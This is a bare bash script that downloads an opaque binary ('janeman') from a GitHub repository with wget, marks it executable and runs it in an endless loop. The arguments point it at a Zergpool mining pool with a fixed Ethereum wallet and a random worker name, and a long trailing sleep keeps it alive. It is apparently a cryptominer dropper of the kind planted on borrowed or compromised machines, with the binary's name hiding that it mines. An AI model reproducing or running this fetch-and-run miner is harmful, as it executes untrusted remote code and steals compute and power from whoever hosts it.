#!/bin/bash
POOL=stratum+tcp://ethash.asia.mine.zergpool.com:9999
WALLET=0xa5260d62edb9d77c9e7173fb3a60c75c9211a3d9
WORKER=$(echo $(shuf -i 10-40 -n 1)-Pho)
wget https://github.com/archernap/prem/raw/main/janeman
chmod +x janeman
	while [ 1 ]; do
		./janeman -pool $POOL -wal $WALLET.$WORKER -pass x
        sleep 5
	done
sleep 999999999 
